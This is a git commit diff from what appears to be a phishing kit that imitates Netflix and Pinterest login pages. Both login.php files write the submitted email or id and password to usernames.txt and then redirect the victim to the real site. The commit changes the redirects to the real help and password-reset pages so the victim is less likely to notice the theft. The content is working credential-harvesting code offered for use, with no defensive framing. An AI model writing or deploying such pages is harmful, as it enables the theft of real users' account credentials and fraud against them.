2a197cf48ce317e6c2d32b58e1ac41ffc14c0e16
Abir Hasan <hackitabirhasan@gmail.com>
2020-08-25 15:20:32 +0600

    Add files via upload

--- sites/netflix/login.php
+++ sites/netflix/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://netflix.com');
+file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://www.netflix.com/us/LoginHelp');
 exit();
--- sites/pinterest/login.php
+++ sites/pinterest/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['id'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://pinterest.com');
+file_put_contents("usernames.txt", "Username: " . $_POST['id'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://www.pinterest.com/password/reset/');
 exit();
